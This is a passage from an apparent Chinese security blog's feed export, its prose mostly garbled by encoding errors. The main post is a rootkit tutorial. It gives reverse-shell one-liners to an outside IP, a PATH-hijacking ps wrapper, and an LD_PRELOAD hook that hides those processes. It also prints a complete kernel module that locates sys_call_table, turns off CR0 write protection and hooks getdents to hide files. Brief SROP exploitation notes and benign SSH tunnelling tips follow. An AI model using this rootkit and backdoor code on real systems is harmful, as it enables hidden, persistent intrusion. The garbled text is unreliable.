/dev/tcp/192.168.100.100/9999 0&gt;&amp;1 socat TCP:192.168.100.100:9999 EXEC:/bin/bash æ‰‹æ³• å‡è¨­åœ¨ $PATH ç’°å¢ƒè®Šæ•¸ä¸­ /usr/local/bin åœ¨ /bin å‰é¢ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥å¯«ä¸€å€‹æª”æ¡ˆåœ¨ /usr/local/bin/psï¼Œé€™æ¨£ ps å°±æœƒåŸ·è¡Œ /usr/local/bin/ps è€Œä¸æ˜¯ /bin/psï¼Œè€Œé”åˆ° hook ç¨‹åºçš„æ•ˆæœ 12#!/bin/bash/bin/ps $@ | grep -Ev '192.168.100.100|socat' grep -Ev æ˜¯ inverse match $@ æ˜¯å‚³é€²ä¾†çš„åƒæ•¸ ( é€™è£¡åŸå°ä¸å‹•çš„äº¤çµ¦ /bin/ps ) éš±ä¹‹å‘¼å¸è²³ä¹‹å‹ - LD_PRELOAD æ¢ä»¶ ä¸éœ€è¦ root ç›®æ¨™ åœ¨ ps çš„çµæœä¸­éš±è—ä¸‹é¢å…©ç¨®ç°¡å–®çš„å¾Œé–€ bash -i &gt;&amp; /dev/tcp/192.168.100.100/9999 0&gt;&amp;1 socat TCP:192.168.100.100:9999 EXEC:/bin/bash è¦ hook å“ªå€‹å‡½å¼ é¦–å…ˆæˆ‘å€‘å¯ä»¥ç”¨ ltrace çœ‹ ps è·‘èµ·ä¾†å‘¼å«äº†å“ªäº› library çš„å‡½å¼ 1234567...fwrite(&quot; [jfsCommit]\\nhe]\\n4\\n0\\n\\nstart\\ngrou&quot;..., 13, 1, 0x7fbfcd303760) = 1readproc(0x55e061b12f90, 0x55e0609d1540, 13, 1024) = 0x55e0609d1540escape_str(0x7fbfcd90b090, 0x55e0609d1740, 0x20000, 0x7fff6f748044) = 4strlen(&quot;root&quot;) = 4fwrite(&quot;root&quot;, 4, 1, 0x7fbfcd303760) = 1... æœƒç™¼ç¾ readproc ä¸€ç›´å‡ºç¾ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ man page 12345678NAME readproc, freeproc - read information from next /proc/## entrySYNOPSIS #include &lt;proc/readproc.h&gt; proc_t* readproc(PROCTAB *PT, proc_t *return_buf); void freeproc(proc_t *p); é‚£æˆ‘å€‘å°±åœ¨ ps çš„åŸå§‹ç¢¼ä¸­æ‰¾ä¸€ä¸‹ readproc çš„ç”¨æ³•ï¼Œå¦‚ä¸‹ procps-3.2.8/ps/display.c >331123456789ptp = openproc(needs_for_format | needs_for_sort | needs_for_select | needs_for_threads);if(!ptp) { fprintf(stderr, &quot;Error: can not access /proc.\\n&quot;); exit(1);}memset(&amp;buf, '#', sizeof(proc_t));switch(thread_flags &amp; (TF_show_proc|TF_loose_tasks|TF_show_task)){case TF_show_proc: // normal non-thread output while(readproc(ptp,&amp;buf)){}} å¦‚ä½•å–å¾— ps åŸå§‹ç¢¼ps é€™å€‹æŒ‡ä»¤æ˜¯ä¾†è‡ª procpsï¼Œå¯ä»¥å¾ procps.sourceforge.net ä¸‹è¼‰ å¦å¤–å…¶ä»–åŸºæœ¬çš„ shell æŒ‡ä»¤çš„åŸå§‹ç¢¼å‰‡å¯ä»¥å¾ www.gnu.org/software/coreutils ä¸‹è¼‰ åŸºæœ¬ä¸Šå°±æ˜¯å…ˆ openproc ç„¶å¾Œå†ç”¨ readproc ä¸€æ¬¡è®€ä¸€å€‹ process entry ptp çš„å‹æ…‹æ˜¯ PROCTAB*ï¼Œè£¡é¢æœ‰ linked list çš„çµæ§‹ï¼Œè®“ç¨‹å¼èƒ½æ‰¾åˆ°ä¸‹ä¸€å€‹ process buf çš„å‹æ…‹æ˜¯ proc_t*ï¼ŒåŒ…å«äº† process çš„è³‡è¨Š é‚£æˆ‘å€‘å°±å» hook readproc é€™å€‹å‡½å¼ï¼ŒæŠŠæƒ³éš±è—çš„ procss è·³é dlsym 1typeof(readproc) *old_readproc = dlsym(RTLD_NEXT, &quot;readproc&quot;); é€™è¡Œæ˜¯ LD_PRELOAD æŠ€å·§çš„é—œéµï¼Œæˆ‘å€‘ç”¨ dlsym é€™å€‹å‡½å¼ä¾†æ‰¾ symbol çš„ä½å€ æ”¾ RTLD_NEXT é€™å€‹åƒæ•¸æœƒæ‰¾ä¸‹ä¸€å€‹ symbol è€Œä¸æ˜¯ç¬¬ä¸€å€‹ typeof(readproc) åªæ˜¯ä¸€å€‹èªæ³•ç³–ï¼Œä»£è¡¨ readproc é€™å€‹ function pointer çš„å‹æ…‹ POC åŸå§‹ç¢¼ hook.c123456789101112131415161718192021#define _GNU_SOURCE#include &lt;dlfcn.h&gt;#include &lt;string.h&gt;#include &lt;proc/readproc.h&gt;int hidden (char *target) { char *keywords[2] = { &quot;192.168.100.100&quot;, &quot;socat&quot; }; for (int i = 0; i &lt; 2; i++) if (strstr(target, keywords[i])) return 1; return 0;}proc_t* readproc (PROCTAB *PT, proc_t *return_buf) { typeof(readproc) *old_readproc = dlsym(RTLD_NEXT, &quot;readproc&quot;); proc_t* ret_value = old_readproc(PT, return_buf); while (ret_value &amp;&amp; ret_value-&gt;cmdline &amp;&amp; hidden(ret_value-&gt;cmdline[0])) { ret_value = old_readproc(PT, return_buf); } return ret_value;} ç·¨è­¯ 1gcc -fPIC -shared -o hook.so hook.c åŸ·è¡Œ æŒ‡å®š LD_PRELOAD ç’°å¢ƒè®Šæ•¸ä¾†è¼‰å…¥ç·¨è­¯å¥½çš„å‹•æ…‹é€£çµåº«ï¼Œä½†åªæœ‰è©²æ¬¡ç”Ÿæ•ˆ 1LD_PRELOAD=/path/to/hook.so ps aux æˆ–æ˜¯ç·¨è¼¯ ld.so.preloadï¼Œå¯«å…¥ hook.so çš„è·¯å¾‘ï¼Œä¹‹å¾Œæ¯æ¬¡åŸ·è¡Œéƒ½æœƒè¼‰å…¥ï¼Œå¯ä»¥ç”¨ ldd æŸ¥çœ‹æ˜¯å¦æˆåŠŸ preload DEMO éš±ä¹‹å‘¼å¸åƒä¹‹å‹ - Loadable Kernel Module æ¢ä»¶ éœ€è¦ root ç›®æ¨™ åœ¨ ls çš„çµæœä¸­éš±è— rootkit.ko å–å¾— sys_call_table é¦–å…ˆå› ç‚ºæˆ‘å€‘è¦ hijack system call æ‰€ä»¥è¦å…ˆå–å¾— sys_call_table çš„ä½å€ æ–¹æ³•ä¸€ åœ¨ 2.4 ä»¥å‰çš„å…§æ ¸ç‰ˆæœ¬ï¼Œé è¨­å°å‡ºæ‰€æœ‰ç¬¦è™Ÿï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç”¨ å¦‚æœè‡ªå·±ç·¨è­¯å…§æ ¸çš„è©±ï¼Œå¯ä»¥ä¿®æ”¹åŸå§‹ç¢¼ç”¨ EXPORT_SYMBOL æŠŠ sys_call_table çš„ç¬¦è™Ÿå°å‡ºä¾† 1extern void *sys_call_table[]; æ–¹æ³•äºŒ kallsyms_lookup_name é€™å€‹å‡½å¼ä¹Ÿå¯ä»¥æŠ“ä½å€ï¼Œä½†ä»–ä¹Ÿä¸ä¸€å®šæœƒè¢«å°å‡º 123456789#include &lt;linux/kallsyms.h&gt;static void **sys_call_table;static int __init hook_init (void) { sys_call_table = (void **)kallsyms_lookup_name(&quot;sys_call_table&quot;); printk(KERN_INFO &quot;sys_call_table = 0x%px\\n&quot;, sys_call_table); return 0;} How to printk a pointer ?è¦ç”¨ printk å°å‡º pointer å¯ä»¥ç”¨ %px %p åªæœƒå°å‡ºè©²æŒ‡æ¨™çš„é›œæ¹Šå€¼è€Œä¸æ˜¯çœŸæ­£çš„æŒ‡æ¨™çš„å€¼ï¼Œé€™æ˜¯ç‚ºäº†é¿å…æ´©æ¼å…§æ ¸ä½å€ æ–¹æ³•ä¸‰ ä¸‹é¢å…©å€‹æª”æ¡ˆè·¯å¾‘æœ‰å¯èƒ½æœƒæœ‰ sys_call_table çš„ä½å€ /proc/kallsyms æ˜¯ä¸€å€‹ç‰¹æ®Šçš„æª”æ¡ˆï¼Œæœƒåœ¨è®€å–æ™‚å‹•æ…‹ç”¢ç”Ÿ 12cat /boot/System.map-$(uname -r) | grep &quot;sys_call_table&quot;cat /proc/kallsyms | grep &quot;sys_call_table&quot; æ–¹æ³•å›› æœ€ç©©çš„æ–¹å¼æ˜¯è‡ªå·±å» kernel è£¡é¢æ’ˆ memory æƒ³æ³•æºè‡ªæ–¼é€™ç¯‡ï¼Œä½† kernel 5.x.x æœ‰å¤šåŒ…äº†ä¸€å±¤ do_syscall_64ï¼Œéœ€è¦åšä¸€äº›æ”¹å‹• 1234567891011121314151617181920212223uint8_t *get_syscalltable (void) { int lo, hi; asm volatile(&quot;rdmsr&quot; : &quot;=a&quot; (lo), &quot;=d&quot; (hi) : &quot;c&quot; (MSR_LSTAR)); uint8_t *entry_SYSCALL_64 = (uint8_t *)(((uint64_t)hi &lt;&lt; 32) | lo); uint8_t *ptr; uint8_t do_syscall_64_inst[7] = { 0x48, 0x89, 0xc7, // mov rdi, rax 0x48, 0x89, 0xe6, // mov rsi, rsp 0xe8, // call do_syscall_64 }; ptr = find(entry_SYSCALL_64, do_syscall_64_inst, 7); uint8_t *do_syscall_64 = (uint8_t *)(ptr + 11 + ((uint64_t)0xffffffff00000000 | *(uint32_t *)(ptr + 7))); uint8_t sys_call_table_inst[4] = { 0x48, 0x8b, 0x04, 0xfd // mov rax, QWORD PTR [rdi*8-?] }; ptr = find(do_syscall_64, sys_call_table_inst, 4); uint8_t *sys_call_table = (uint8_t *)((uint64_t)0xffffffff00000000 | *(uint32_t *)(ptr + 4)); return sys_call_table;} è¦ç†è§£ä¸Šé¢çš„ç¨‹å¼ç¢¼åœ¨åšä»€éº¼ï¼Œæˆ‘å€‘éœ€è¦çŸ¥é“ä¸‹é¢å…©ä»¶äº‹ Module Specific Register æ˜¯ä»€éº¼ ? module specific register æ˜¯ä¸€å¡Šè·Ÿ CPU æœ‰é—œçš„æš«å­˜å™¨ æ¯å€‹ msr éƒ½æœƒæœ‰å€‹ indexï¼Œå¯ä»¥æƒ³åƒæˆä¸€å€‹å¾ˆå¤§çš„é™£åˆ— ç”¨ rdmsr, wrmsr é€™çµ„ instructions å¯ä»¥å° msr åšè®€å¯«ï¼Œå¿…é ˆæä¾› index kernel ä¸€é–‹å§‹åœ¨åˆå§‹åŒ–çš„æ™‚å€™ï¼ŒæŠŠ entry_SYSCALL_64 å¯«åˆ° msr[MSR_LSTAR] syscall åŸ·è¡Œä¸‹å»å¯¦éš›ä¸Šæ˜¯ç™¼ç”Ÿä»€éº¼äº‹ ? ä½¿ç”¨è€…å‘¼å« syscall åˆ‡æ›åˆ° ring 0 è·³å» msr[MSR_LSTAR] é€™å€‹ä½å€ä¹Ÿå°±æ˜¯ entry_SYSCALL_64 é€™è£¡ å‘¼å« do_syscall_64 regs-&gt;ax = sys_call_table[nr](regs); é€™è¡Œå‘¼å«å°æ‡‰çš„å‡½å¼ è§£è®€ä¸Šé¢çš„ç¨‹å¼ç¢¼çš„æ­¥é©Ÿ æˆ‘å€‘å·²ç¶“åœ¨ ring 0 äº† ç›´æ¥ç”¨ rdmsr è®€ msr[MSR_LSTAR] ç›´æ¥åœ¨ entry_SYSCALL_64 çš„ instructions è£¡é¢æ‰¾ä¸‹é¢é€™å€‹ pattern 123movq %rax, %rdi,movq %rsp, %rsicall do_syscall_64 é€™æ¨£å°±æ‰¾åˆ° do_syscall_64 äº† é€²åˆ° do_syscall_64 å¾Œï¼Œä¸€æ¨£ç•«è‘«è˜†ï¼Œå†æ‰¾ä¸‹é¢é€™å€‹ pattern 1mov rax, QWORD PTR [rdi*8-?] æœ€å¾Œï¼Œé€™å€‹å•è™Ÿçš„å€¼å°±æœƒæ˜¯ sys_call_table çš„ä½å€ è®“ sys_call_table å¯ä»¥å¯«å…¥ cr0 register çš„å…¶ä¸­ä¸€å€‹ bit æ˜¯ä»£è¡¨ read-only å€æ®µå¯ä¸å¯å¯«ï¼Œæ”¹æˆ 0 å°±é€šé€šå¯å¯«å•¦ write_cr0 é€™å€‹ function åœ¨ kernel 5.x.x ç‰ˆåŠ äº†æª¢æŸ¥ï¼Œä¸éæˆ‘å€‘ç›´æ¥å¯« assembly å°±æ²’å•é¡Œå•¦ 123456789void writable_unlock (void) { unsigned long val = read_cr0() &amp; (~X86_CR0_WP); asm volatile(&quot;mov %0,%%cr0&quot;: &quot;+r&quot; (val));}void writable_lock (void) { unsigned long val = read_cr0() | X86_CR0_WP; asm volatile(&quot;mov %0,%%cr0&quot;: &quot;+r&quot; (val));} è¦ hook å“ªå€‹ syscall ps åšçš„äº‹æƒ…å°±æ˜¯å»è®€ /proc åº•ä¸‹æ‰€æœ‰æª”æ¡ˆï¼ŒåŸºæœ¬ä¸Šæ˜¯ ls çš„å¼·åŒ–ç‰ˆï¼Œé‚£æˆ‘å€‘é€™æ¬¡å°±å…ˆåš ls éš±è—æª”æ¡ˆ ä¸€æ¨£ç”¨ strace ls å»çœ‹ä»–å‘¼å«äº†å“ªäº› syscall 123456getdents(3, /* 16 entries */, 32768) = 512getdents(3, /* 0 entries */, 32768) = 0close(3)fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 1), ...}) = 0write(1, &quot;a\\thook.c\\t initramfs\\t linux-5.&quot;..., 75) = 75write(1, &quot;attach\\thook.so initramfs.cpio.g&quot;..., 90) = 90 getdents çœ‹èµ·ä¾†æ˜¯é—œéµçš„ syscallï¼ŒæŸ¥çœ‹ä¸€ä¸‹ man page 12345678910NAME getdents, getdents64 - get directory entriesSYNOPSIS int getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count); int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count); Note: There are no glibc wrappers for these system calls; see NOTES. getdents è·‘å®Œå¾ŒæœƒæŠŠçµæœå­˜åˆ° dirp è£¡é¢ï¼Œé‚£æˆ‘å€‘å°±éæ­· dirp æŠŠè¦éš±è—çš„ä¸Ÿæ‰å°±å¥½äº† kernel 4.x.x çš„åƒæ•¸æ˜¯æ”¾åœ¨ stack å‚³çš„ï¼Œä½† kernel 5.x.x å¤šåŒ…äº†ä¸€å±¤ do_syscall_64ï¼Œåƒæ•¸å‚³éè®Šæˆæ˜¯é€é struct pt_regs *regs é€™å€‹çµæ§‹å»å‚³ rootkit.c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899#include &lt;linux/init.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/kallsyms.h&gt;#include &lt;linux/syscalls.h&gt;MODULE_LICENSE(&quot;GPL&quot;);struct linux_dirent { unsigned long d_ino; /* Inode number */ unsigned long d_off; /* Offset to next linux_dirent */ unsigned short d_reclen; /* Length of this linux_dirent */ char d_name[]; /* Filename (null-terminated) */};void **sys_call_table;int (*original_getdents) (struct pt_regs *regs);void writable_unlock (void) { unsigned long val = read_cr0() &amp; (~X86_CR0_WP); asm volatile(&quot;mov %0,%%cr0&quot;: &quot;+r&quot; (val));}void writable_lock (void) { unsigned long val = read_cr0() | X86_CR0_WP; asm volatile(&quot;mov %0,%%cr0&quot;: &quot;+r&quot; (val));}uint8_t *find (uint8_t *a, uint8_t *b, size_t len) { for (uint8_t *ptr = a, i = 0; i &lt; 500; i++, ptr++) { if (!strncmp(ptr, b, len)) { return ptr; } } return 0;}uint8_t *get_syscalltable (void) { int lo, hi; asm volatile(&quot;rdmsr&quot; : &quot;=a&quot; (lo), &quot;=d&quot; (hi) : &quot;c&quot; (MSR_LSTAR)); uint8_t *entry_SYSCALL_64 = (uint8_t *)(((uint64_t)hi &lt;&lt; 32) | lo); uint8_t *ptr; uint8_t do_syscall_64_inst[7] = { 0x48, 0x89, 0xc7, // mov rdi, rax 0x48, 0x89, 0xe6, // mov rsi, rsp 0xe8, // call do_syscall_64 }; ptr = find(entry_SYSCALL_64, do_syscall_64_inst, 7); uint8_t *do_syscall_64 = (uint8_t *)(ptr + 11 + ((uint64_t)0xffffffff00000000 | *(uint32_t *)(ptr + 7))); uint8_t sys_call_table_inst[4] = { 0x48, 0x8b, 0x04, 0xfd // mov rax, QWORD PTR [rdi*8-?] }; ptr = find(do_syscall_64, sys_call_table_inst, 4); uint8_t *sys_call_table = (uint8_t *)((uint64_t)0xffffffff00000000 | *(uint32_t *)(ptr + 4)); return sys_call_table;}#define FILENAME &quot;rootkit.ko&quot;int sys_getdents_hook(struct pt_regs *regs) { int total = original_getdents(regs); unsigned int fd = regs-&gt;di; struct linux_dirent *dirent = regs-&gt;si; unsigned int count = regs-&gt;dx; int offset = 0; while (offset &lt; total) { struct linux_dirent *ptr = (struct linux_dirent *)((uint8_t *)dirent + offset); struct linux_dirent *next_ptr = (struct linux_dirent *)((uint8_t *)dirent + offset + ptr-&gt;d_reclen); if (strncmp(ptr-&gt;d_name, FILENAME, strlen(FILENAME)) == 0) { int reclen = ptr-&gt;d_reclen; memmove(ptr, next_ptr, total - (offset + reclen)); total -= reclen; } else { offset += ptr-&gt;d_reclen; } } return total;}static int rootkit_init(void) { sys_call_table = (void **)get_syscalltable(); printk(KERN_INFO &quot;sys_call_table = %llu\\n&quot;, sys_call_table); writable_unlock(); original_getdents = sys_call_table[__NR_getdents]; sys_call_table[__NR_getdents] = sys_getdents_hook; return 0;}static void rootkit_exit(void) { sys_call_table[__NR_getdents] = original_getdents; writable_lock();}module_init(rootkit_init);module_exit(rootkit_exit); DEMO 1: http://fluxius.handgrep.se/2011/10/31/the-magic-of-ld_preload-for-userland-rootkits/ 2: https://exploit.ph/linux-kernel-hacking/2014/10/23/rootkit-for-hiding-files/ 3: https://docs-conquer-the-universe.readthedocs.io/zh_CN/latest/gnu_linux.html 4: https://www.kernel.org/doc/Documentation/printk-formats.txt 5: https://blog.trailofbits.com/2019/01/17/how-to-write-a-rootkit-without-really-trying/","link":"/2019/06/07/rootkit/"},{"title":"ã€æ”»æ“Šæ‰‹æ³•ã€‘SROP","text":"SROP æ˜¯ Sigreturn Oriented Programming çš„ç¸®å¯« Signal ä¸€æ”¯ç¨‹å¼æ¥åˆ° signal å¾Œ kernel æœƒå¹«ä½ æŠŠä¸Šä¸‹æ–‡ ( å„ç¨®æš«å­˜å™¨ ) ä¿ç•™åˆ° stack ä¸Šï¼Œå«åš Signal Frame è·³å› user modeï¼Œè®“ signal handler è™•ç† signal handler è™•ç†å®Œæœƒ return å› __restore_rtï¼Œé€™å€‹ function è£¡é¢å°±æ˜¯ mov rax, 0xf; syscallï¼Œå»å‘¼å« sys_rt_sigreturn syscallï¼ŒæŠŠä¸Šä¸‹æ–‡æ¢å¾© Signal Frame SigReturn ROP åœ¨åš ROP çš„æ™‚å€™éœ€è¦è¨­å®šè¨±å¤šæš«å­˜å™¨çš„å€¼ é€™æ™‚å€™å°±å¯ä»¥ç”¨ SROP çš„æŠ€å·§ è‡ªå·±åœ¨ stack ä¸Šæ“ºå¥½ Signal Frameï¼Œç„¶å¾Œå‘¼å« sys_rt_sigreturn syscall å°±å¯ä»¥ä¸€æ¬¡è¨­å®šå¥½æ‰€æœ‰çš„æš«å­˜å™¨ ç¼ºé»æ˜¯éœ€è¦å¤ å¤§çš„ç©ºé–“å¡ä¸‹æ•´å€‹ Signal Frame sys_rt_sigreturn syscall gadget å“ªè£¡æœ‰ mov rax, 0xf; syscall çš„ gadget å¯ä»¥ç”¨ libc è£¡é¢çš„ __restore_rt è‡ªå·±ç”¨ ROP è¨­å®šå¥½ rax, å†æ¥ syscall gadget pwntools SigFrame 123456789frame = SigreturnFrame()frame.rsp = 0frame.rax = 0frame.rdi = 0frame.rsi = 0frame.rdx = 0frame.rip = 0rop = bytes(frame) CTF é¡Œç›® pwnable.kr - unexploitable https://www.slideshare.net/AngelBoy1/sigreturn-ori http://weaponx.site/2017/02/28/unexploitable-Writeup-pwnable-kr/","link":"/2019/09/18/srop/"},{"title":"ã€æŒ‡ä»¤æ€éº¼ç”¨ã€‘SSH çš„åå¤§å¦™ç”¨","text":"ssh config ~/.ssh/config1234Host vps HostName 123.45.67.89 User oalieno Port 22000 æ¯æ¬¡éƒ½æ‰“ä¸€é•·ä¸²çš„åƒæ•¸å¾ˆéº»ç…©ï¼Œå¯ä»¥å…ˆåœ¨ ~/.ssh/config è¨­å®šå¥½ åƒä¸Šé¢é€™æ¨£è¨­å®šå¥½å¾Œ ssh vps å°±ç­‰åŒæ–¼ ssh -p 22000 oalieno@123.45.67.89 IdentityFile ~/.ssh/config1234Host vps HostName 123.45.67.89 User oalieno IdentityFile ~/.ssh/id_rsa IdentityFile å°±æ˜¯æŒ‡å®šè¦ç”¨å“ªå€‹ keyï¼Œç­‰åŒæ–¼ -i ~/.ssh/id_rsa é è¨­æœƒæŠ“ id_*.pub ä¸­æœ€æ–°çš„ ( /usr/bin/ssh-copy-id 59 è¡Œ ) local port forwarding ( ssh tunnel ) ~/.ssh/config1234Host vps HostName 123.45.67.89 User oalieno LocalForward 5555 127.0.0.1:6666 è¨­å®šå¥½å¾Œå¯ä»¥ç›´æ¥æ‰“ä»¥ä¸‹æŒ‡ä»¤ 123ssh -f -N vps# -f : run in background# -N : not execute remote command, useful for forwarding ports å°±æœƒç­‰åŒæ–¼ä»¥ä¸‹æŒ‡ä»¤ 123ssh -f -N -L 5555:127.0.0.1:6666 oalieno@123.45.67.89# -f : run in background# -N : not execute remote command, useful for forwarding ports local:5555 -&gt; remote:127.0.0.1:6666 åŸ·è¡Œé€™å€‹æŒ‡ä»¤ï¼Œå°±æœƒåœ¨ local è½ 5555 port ç„¶å¾ŒæŠŠæµé‡éƒ½å°åˆ° remote çš„ 127.0.0.1 çš„ 6666 port remote port forwarding ( reverse ssh tunnel ) ~/.ssh/config1234Host vps HostName 123.45.67.89 User oalieno RemoteForward 6666 127.0.0.1:5555 è¨­å®šå¥½å¾Œå¯ä»¥ç›´æ¥æ‰“ä»¥ä¸‹æŒ‡ä»¤ 123ssh -f -N vps# -f : run in background# -N : not execute remote command, useful for forwarding ports å°±æœƒç­‰åŒæ–¼ä»¥ä¸‹æŒ‡ä»¤ 123ssh -f -N -R 6666:127.0.0.1:5555 oalieno@123.45.67.89# -f : run in background# -N : not execute remote command, useful for forwarding ports remote:6666 -&gt; local:127.0.0.1:5555 åŸ·è¡Œé€™å€‹æŒ‡ä»¤ä¹‹å¾Œï¼Œå°±æœƒåœ¨ remote è½ 6666 port ç„¶å¾ŒæŠŠæµé‡éƒ½å°åˆ° local çš„ 127.0.0.1 çš„ 5555 port dynamic port forwarding ~/.ssh/config1234Host vps HostName 123.45.67.89 User oalieno DynamicForward 9999 è¨­å®šå¥½å¾Œå¯ä»¥ç›´æ¥æ‰“ä»¥ä¸‹æŒ‡ä»¤ 123ssh -f -N vps# -f : run in background# -N : not execute remote command, useful for forwarding ports å°±æœƒç­‰åŒæ–¼æ‰“ä»¥ä¸‹æŒ‡ä»¤ 123ssh -f -N -D 9999 oalieno@123.45.67.89# -f : run in background# -N : not execute remote command, useful for forwarding ports æœƒé–‹ä¸€å€‹ SOCKS ä»£ç†ä¼ºæœå™¨è½åœ¨ local çš„ 9999 portï¼ŒæŠŠæµé‡éƒ½è½‰å¾ remote çš„æ©Ÿå™¨å‡ºå» æƒ…å¢ƒä¸€ï¼šå­˜å–å…§ç¶²è³‡æº ä½ åœ¨ä½ ç§Ÿçš„ vps ä¼ºæœå™¨ä¸Šé¢è·‘äº†ä¸€å€‹ mattermost åœ¨æ¸¬è©¦ ä½†ä½ ä¸æƒ³è®“ mattermost è½åœ¨ 0.0.0.0 å…¬é–‹åœ¨ç¶²è·¯ä¸Šè®“å¤§å®¶éƒ½å¯ä»¥é€£ï¼Œæœ‰é¢¨éšª æ‰€ä»¥ä½ é–‹åœ¨ 127.0.0.1 åªæœ‰ vps æœ¬åœ°å¯ä»¥é€£ ä½†æ˜¯ä½ åˆæƒ³ç”¨ä½ çš„ç­†é›»ä¸Šçš„ç€è¦½å™¨æ¸¬è©¦ é€™æ™‚å€™å°±å¯ä»¥ç”¨åˆ° local port forwarding æŠŠ local:8065 -&gt; remote:127.0.0.1:8065 è¨­å®šå¦‚ä¸‹ä¹‹å¾Œï¼ŒåŸ·è¡Œ ssh -f -N vps-mattermost å°±å¯ä»¥åœ¨æœ¬åœ°ç€è¦½å™¨ä¸Šé¢è¼¸å…¥ http://localhost:8065 é€£åˆ°ä½ æ¶å¥½çš„ mattermost äº† ~/.ssh/config1234Host vps-mattermost HostName 123.45.67.89 User oalieno LocalForward 8065 127.0.0.1:8065 æƒ…å¢ƒäºŒï¼šé€éè·³æ¿ ssh åˆ°æ²’æœ‰ public ip çš„æ©Ÿå™¨ ä½ åœ¨å®¶è£¡çµ„äº†ä¸€å°æ¡Œæ©Ÿï¼Œä½†æ˜¯é€™å°æ¡Œæ©Ÿæ²’æœ‰ public ipï¼Œæ‰€ä»¥åœ¨å¤–é¢çš„æ™‚å€™æ²’è¾¦æ³• ssh é€£åˆ°å®¶è£¡çš„æ¡Œæ©Ÿ ä¸éä½ å‰›å¥½ç§Ÿäº†ä¸€å°æœ‰ public ip çš„ vps ä¼ºæœå™¨ é€™æ™‚å€™å°±å¯ä»¥ç”¨åˆ° remote port forwarding æŠŠ remote:22000 -&gt; local:127.0.0.1:22 è¨­å®šå¦‚ä¸‹ä¹‹å¾Œï¼Œåœ¨æ¡Œæ©Ÿä¸ŠåŸ·è¡Œ ssh -f -N vps-reverse-ssh å°±å¯ä»¥å¾ä½ çš„ç­†é›»å…ˆ ssh åˆ° vps ç„¶å¾Œå†å¾ vps é€šé remote port forwarding ssh åˆ°æ¡Œæ©Ÿäº† æœ‰ public ip çš„ vps ä¼ºæœå™¨åœ¨é€™è£¡æ‰®æ¼”äº†è·³æ¿çš„è§’è‰² ~/.ssh/config (æ¡Œæ©Ÿ)1234Host vps-reverse-ssh HostName 123.45.67.89 User oalieno RemoteForward 22000 127.0.0.1:22 ~/.ssh/config (vps)1234Host home HostName 127.0.0.1 User oalieno Port 22000 autossh autossh å¯ä»¥å¹«ä½ è‡ªå‹•é‡é€£ ~/.ssh/config1234567Host vps HostName 123.45.67.89 User oalieno IdentityFile ~/.ssh/id_rsa LocalForward 5555 127.0.0.1:6666 ServerAliveInterval 30 ServerAliveCountMax 3 è¨­å®šå¥½å¾Œå¯ä»¥ç›´æ¥æ‰“ä»¥ä¸‹æŒ‡ä»¤ 1234autossh -M 0 -f -N vps# -M 0 : autossh echo port, recommend disable it by setting it to 0# -f : run in background# -N : not execute remote command, useful for forwarding ports å°±æœƒç­‰åŒæ–¼æ‰“ä»¥ä¸‹æŒ‡ä»¤ 1234autossh -M 0 -f -N -o &quot;ServerAliveInterval 30&quot; -o &quot;ServerAliveCountMax 3&quot; -L 5555:localhost:6666 oalieno@123.45.67.89# -M 0 : autossh echo port, recommend disable it by setting it to 0# -f : run in background# -N : not execute remote command, useful for forwarding ports escape sequence æœ‰æ™‚å€™é€£ç·šæ–·æ‰å¾Œï¼Œç•«é¢å°±æœƒå¡åœ¨é‚£è£¡ é€™æ™‚å€™å°±å¯ä»¥ç›´æ¥åœ¨éµç›¤ä¸Šæ‰“ ~. é€™å€‹ escape sequences å°±å¯ä»¥ç›´æ¥è·³å‡ºä¾†å•¦ï¼Œæ„Ÿè¦ºåƒæ˜¯åœ¨é€ƒè„« vim å‘¢xD ä¸‹é¢é‚„æœ‰æ›´å¤šçš„ç¥ç§˜é‡‘æ‰‹æŒ‡å¯ä»¥æ‰“ 123456789101112Supported escape sequences: ~. - terminate connection (and any multiplexed sessions) ~B - send a BREAK to the remote system ~C - open a command line ~R - request rekey ~V/v - decrease/increase verbosity (LogLevel) ~^Z - suspend ssh ~# - list forwarded connections ~&amp; - background ssh (when waiting for connections to terminate) ~? - this message ~~ - send the escape character by typing it twice(Note that escapes are only recognized immediately after newline.) https://linux.die.net/man/5/ssh_config https://nerderati.com/2011/03/17/simplify-your-life-with-an-ssh-config-file/ https://www.everythingcli.org/ssh-tunnelling-for-fun-and-profit-local-vs-remote/ https://askubuntu.com/questions/29942/how-can-i-break-out-of-ssh-when-it-locks https://johnliu55.tw/ssh-tunnel.html","link":"/2018/08/04/ssh/"},{"title":"ã€ä¸€ç§’è®Šæ™‚å°šã€‘zimfw + powerlevel10k + nord","text":"Zimfw æˆ‘ä¹Ÿæ˜¯ç”¨äº†å¾ˆä¹…çš„ oh-my-zshï¼Œä¸€ç›´éƒ½è¦ºå¾— terminal æœ‰é»æ…¢ï¼Œä¸éç›´åˆ°çœ‹åˆ°é€™ç¯‡ æ‰“é€ å±¬æ–¼ä½ è‡ªå·±çš„æ¥µé€Ÿ Shellã€ŒiTerm + zsh + zim + powerlevel10kã€ï¼Œæ‰æœ‰æƒ³è¦æ›çš„å¿µé ­ zimfw çš„å„ªé»å°±æ˜¯å¿«ï¼Œé›–ç„¶ä»–ä¸åƒ oh-my-zsh ä¸€æ¨£æœ‰é€™éº¼å¤šå…§å»ºçš„æ’ä»¶ï¼Œä½†ä¸€èˆ¬çš„ zsh æ’ä»¶ä»–ä¹Ÿéƒ½å¯ä»¥å®‰è£ï¼Œè€Œä¸”æœ€å¸¸ç”¨ä¹Ÿä¸€å®šè¦æœ‰çš„ zsh-syntax-highlight, zsh-completions, zsh-autosuggestions é è¨­éƒ½å¹«ä½ é…ç½®å¥½äº†ï¼Œå…¶ä»–æ’ä»¶çš„å®‰è£è«‹çœ‹ä¸‹é¢çš„èªªæ˜ æ’ä»¶å®‰è£ å®˜æ–¹æä¾›çš„æ’ä»¶åœ¨é€™ï¼Œarchive é è¨­æ²’è£ï¼Œæˆ‘æ¨è–¦å¯ä»¥å®‰è£ï¼Œä»–è·Ÿ oh-my-zsh çš„ extract 